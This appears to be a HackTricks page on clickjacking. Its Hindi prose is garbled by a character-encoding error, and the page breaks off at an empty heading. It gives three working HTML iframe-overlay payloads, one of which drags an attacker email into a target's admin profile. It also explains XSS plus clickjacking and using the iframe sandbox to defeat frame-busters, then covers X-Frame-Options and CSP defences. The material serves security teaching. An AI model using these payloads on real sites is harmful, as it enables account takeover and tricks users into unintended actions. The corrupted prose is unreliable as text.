# Clickjacking

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдореЗрд░рд╛** рдЯреНрд╡рд┐рдЯрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ **рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд** **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Clickjacking рдХреНрдпрд╛ рд╣реИ

рдПрдХ clickjacking рд╣рдорд▓реЗ рдореЗрдВ, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ **рд╡реЗрдмрдкреЗрдЬ рдкрд░ рдХрд┐рд╕реА рддрддреНрд╡** рдкрд░ **рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдпрд╛ рддреЛ **рдЕрджреГрд╢реНрдп** рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рддрддреНрд╡ рдХреЗ рд░реВрдк рдореЗрдВ рдЫрд▓рдХрд░ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЕрдирдЬрд╛рдиреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдореЗрдВ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдореИрд▓рд╡реЗрдпрд░ рдХрд╛ рдбрд╛рдЙрдирд▓реЛрдб, рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд╡реЗрдм рдкреЗрдЬ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди, рдкреНрд░рдорд╛рдг-рдкрддреНрд░ рдпрд╛ рд╕рдВрдПрдЬрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА рдХреА рдкреНрд░рджрд╛рди, рдзрди рдХреА рд╣рд╕реНрддрд╛рдВрддрд░рдг, рдпрд╛ рдСрдирд▓рд╛рдЗрди рдЙрддреНрдкрд╛рджреЛрдВ рдХреА рдЦрд░реАрджрд╛рд░реАред


### рдкреВрд░реНрд╡-рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдлреЙрд░реНрдо рдЯреНрд░рд┐рдХ

рдХрднреА-рдХрднреА **рдПрдХ рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп GET рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлреЙрд░реНрдо рдХреЗ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЗ рдорд╛рди рдХреЛ рднрд░рдирд╛ рд╕рдВрднрд╡** рд╣реЛрддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХреЛ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдбреЗрдЯрд╛ рд╕реЗ рднрд░рдиреЗ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдЯрди рд╕рдмрдорд┐рдЯ рджрдмрд╛рдиреЗ рдХреЗ рд▓рд┐рдП clickjacking рдкреЗрд▓реЛрдб рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред

### Drag\&Drop рдХреЗ рд╕рд╛рде рдлреЙрд░реНрдо рднрд░реЗрдВ

рдпрджрд┐ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ **рдПрдХ рдлреЙрд░реНрдо рднрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк рдЙрд╕рд╕реЗ рд╕реАрдзреЗ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЬрд╛рдирдХрд╛рд░реА рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрдЫрдирд╛ рдирд╣реАрдВ рдЪрд╛рд╣рддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ рдХрд┐ рдИрдореЗрд▓ рдФрд░ рдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб), рддреЛ рдЖрдк рдЙрд╕рд╕реЗ рдХреЗрд╡рд▓ рдХреБрдЫ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╡рд╣ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд▓рд┐рдЦреЗрдЧрд╛ рдЬреИрд╕реЗ [**рдЗрд╕ рдЙрджрд╛рд╣рд░рдг**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) рдореЗрдВред

### рдореВрд▓ рдкреЗрд▓реЛрдб
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### рдмрд╣реБрдХрджрдо рдкреЗрдпрд▓реЛрдб
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### рдбреНрд░реИрдЧ\&рдбреНрд░реЙрдк + рдХреНрд▓рд┐рдХ рдкреЗрд▓реЛрдб
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **XSS рд╣рдорд▓рд╛ рдкрд╣рдЪрд╛рдирд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рддрддреНрд╡ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ** рддрд╛рдХрд┐ XSS рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдкреГрд╖реНрда **Clickjacking рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ**, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрдЯрди/рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдореЗрдВ рдзреЛрдЦрд╛ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг:\
_рдЖрдкрдиреЗ рдЦрд╛рддреЗ рдХреЗ рдХреБрдЫ рдирд┐рдЬреА рд╡рд┐рд╡рд░рдгреЛрдВ рдореЗрдВ **рд╕реНрд╡рдпрдВ XSS** рдкрд╛рдпрд╛ рд╣реИ (рд╡рд┐рд╡рд░рдг рдЬреЛ **рдХреЗрд╡рд▓ рдЖрдк рд╕реЗрдЯ рдФрд░ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**). рдЗрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдлреЙрд░реНрдо** рд╡рд╛рд▓рд╛ рдкреГрд╖реНрда **Clickjacking** рдХреЗ рд▓рд┐рдП **рд╡рд┐рдХрд▓реНрдк** рд╣реИ рдФрд░ рдЖрдк GET рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде **рдлреЙрд░реНрдо** рдХреЛ **рдкреВрд░реНрд╡-рдкреВрд░реНрдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ._\
\_\_рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдкреГрд╖реНрда рдХреЗ рд▓рд┐рдП рдПрдХ **Clickjacking** рд╣рдорд▓рд╛ рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдлреЙрд░реНрдо** рдХреЛ **XSS рдкреЗрд▓реЛрдб** рдХреЗ рд╕рд╛рде **рдкреВрд░реНрд╡-рдкреВрд░реНрдг** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ **рдлреЙрд░реНрдо** рдХреЛ **рд╕рдмрдорд┐рдЯ** рдХрд░рдиреЗ рдореЗрдВ **рдзреЛрдЦрд╛ рджреЗрдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, **рдЬрдм рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдФрд░ рдорд╛рдиреНрдпрддрд╛рдПрдБ рд╕рдВрд╢реЛрдзрд┐рдд рд╣реЛрддреА рд╣реИрдВ, рддреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ XSS рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред

## Clickjacking рдХреЛ рдиреНрдпрд╛рдпрд╛рдзрд┐рдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдгрдиреАрддрд┐рдпрд╛рдБ

### рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реБрд░рдХреНрд╖рд╛

рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡рд┐рдВрдбреЛ рдореБрдЦреНрдп рдпрд╛ рд╢реАрд░реНрд╖ рд╡рд┐рдВрдбреЛ рд╣реИред
* рд╕рднреА рдлреНрд░реЗрдо рджреГрд╢реНрдпрдорд╛рди рдмрдирд╛рдирд╛ред
* рдЕрджреГрд╢реНрдп рдлреНрд░реЗрдо рдкрд░ рдХреНрд▓рд┐рдХреЛрдВ рдХреЛ рд░реЛрдХрдирд╛ред
* рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рдХреЗ рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рдкрд╣рдЪрд╛рдирдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЪреЗрддрд╛рди рдХрд░рдирд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпреЗ рдлреНрд░реЗрдо-рдмрд╕реНрдЯрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдКрдВрдЪрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕:** рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдЕрдкрдиреА рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдпрд╛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдорд░реНрдерди рдХреА рдХрдореА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдмреНрд▓реЙрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **HTML5 iframe `sandbox` рд╡рд┐рд╢реЗрд╖рддрд╛:** рдПрдХ рд╣рдорд▓рд╛рд╡рд░ `sandbox` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ `allow-forms` рдпрд╛ `allow-scripts` рдорд╛рдиреЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрдЯ рдХрд░рдХреЗ рдлреНрд░реЗрдо рдмрд╕реНрдЯрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдмрд┐рдирд╛ `allow-top-navigation` рдХреЗред рдпрд╣ рдлреНрд░реЗрдо рдХреЛ рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╢реАрд░реНрд╖ рд╡рд┐рдВрдбреЛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд░рдХреНрд╖рд╛

#### X-Frame-Options

**`X-Frame-Options` HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░** рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ `<frame>` рдпрд╛ `<iframe>` рдореЗрдВ рдкреГрд╖реНрда рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЬрд╛рдпрдЬрд╝рдд рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ, Clickjacking рдХреЛ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ:

- `X-Frame-Options: deny` - рдХреЛрдИ рдбреЛрдореЗрди рд╕рд╛рдордЧреНрд░реА рдХреЛ рдлреНрд░реЗрдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред
- `X-Frame-Options: sameorigin` - рдХреЗрд╡рд▓ рд╡рд░реНрддрдорд╛рди рд╕рд╛рдЗрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдлреНрд░реЗрдо рдХрд░ рд╕рдХрддреА рд╣реИред
- `X-Frame-Options: allow-from https://trusted.com` - рдХреЗрд╡рд▓ рдирд┐рд░реНрджрд┐рд╖реНрдЯ 'рдпреВрдЖрд░рдЖрдИ' рд╕рд╛рдЗрдЯ рдХреЛ рдкреГрд╖реНрда рдлреНрд░реЗрдо рдХрд░ рд╕рдХрддреА рд╣реИред
- рдзреНрдпрд╛рди рджреЗрдВ: рдпрджрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░ CSP frame-ancestors рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдЕрдзрд┐рдХ рдкрд╕рдВрдж рдХрд░рддреЗ рд╣реИрдВред

#### Content Security Policy (CSP) frame-ancestors рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛

**CSP рдореЗрдВ `frame-ancestors` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** Clickjacking рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╡рд┐рдзрд┐ рд╣реИ:

- `frame-ancestors 'none'` - `X-Frame-Options: deny` рдХреЗ рд╕рдорд╛рдиред
- `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` рдХреЗ рд╕рдорд╛рдиред
- `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` рдХреЗ рд╕рдорд╛рдиред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CSP рдХреЗрд╡рд▓ рдПрдХ рд╣реА рдбреЛрдореЗрди рд╕реЗ рдлреНрд░реЗрдорд┐рдВрдЧ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

`Content-Security-Policy: frame-ancestors 'self';`

рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдФрд░ рдЬрдЯрд┐рд▓ рдЙрджрд╛рд╣рд░рдг [frame-ancestors CSP рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) рдФрд░ [Mozilla рдХрд╛ CSP frame-ancestors рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) рдореЗрдВ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред

### Content Security Policy (CSP) рдХреЗ рд╕рд╛рде `child-src` рдФрд░ `frame-src`

**Content Security Policy (CSP)** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рд╣реИ рдЬреЛ Clickjacking рдФрд░ рдЕрдиреНрдп рдХреЛрдб рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреМрди рд╕реЗ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рд╕рд╛рдордЧреНрд░реА рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреА рдЪрд╛рд╣рд┐рдПред

#### `frame-src` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛
- рдлреНрд░реЗрдо рдХреЗ рд▓рд┐рдП рд╡реИрдз рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
- `default-src` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖ред
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
рдпрд╣ рдиреАрддрд┐ рд╕рдорд╛рди рдореВрд▓ (self) рдФрд░ https://trusted-website.com рд╕реЗ рдлреНрд░реЗрдо рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

#### `child-src` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛
- рд╡реЗрдм рд╡рд░реНрдХрд░реНрд╕ рдФрд░ рдлреНрд░реЗрдо рдХреЗ рд▓рд┐рдП рд╡реИрдз рд╕реНрд░реЛрдд рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдПрд╕рдкреА рд╕реНрддрд░ 2 рдореЗрдВ рдкреЗрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ред
- frame-src рдФрд░ worker-src рдХреЗ рд▓рд┐рдП рдПрдХ рдлреЙрд▓рдмреИрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
рдпрд╣ рдиреАрддрд┐ рдлреНрд░реЗрдореНрд╕ рдФрд░ рд╡рд░реНрдХрд░реНрд╕ рдХреЛ рдПрдХ рд╣реА рдореВрд▓ (рд╕реНрд╡рдпрдВ) рдФрд░ https://trusted-website.com рд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

**рдЙрдкрдпреЛрдЧ рдиреЛрдЯ:**
- рдкреБрд░рд╛рдирд╛ рд╣реЛ рд░рд╣рд╛ рд╣реИ: child-src рдХреЛ frame-src рдФрд░ worker-src рдХреА рдУрд░ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рд╣рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред
- рдкреНрд░рддрд┐рд╕рд╛рдзрди рд╡реНрдпрд╡рд╣рд╛рд░: рдпрджрд┐ frame-src рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ, рддреЛ рдлреНрд░реЗрдореНрд╕ рдХреЗ рд▓рд┐рдП рдлреЙрд▓рдмреИрдХ рдХреЗ рд░реВрдк рдореЗрдВ child-src рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рджреЛрдиреЛрдВ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИрдВ, рддреЛ default-src рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- рд╕рдЦреНрдд рд╕реНрд░реЛрдд рдкрд░рд┐рднрд╛рд╖рдг: рд╢реЛрд╖рдг рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реНрд░реЛрддреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВред

#### рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлреНрд░реЗрдо-рдмреНрд░реЗрдХрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдЯрдХрдиреЗ рд╡рд╛рд▓рд╛ рдирд╣реАрдВ рд╣реИ, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЖрдзрд╛рд░рд┐рдд рдлреНрд░реЗрдо-рдмреНрд░реЗрдХрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЛ рдлреНрд░реЗрдо рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### рдПрдВрдЯреА-рд╕реАрдПрд╕рдЖрд░рдПрдл рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

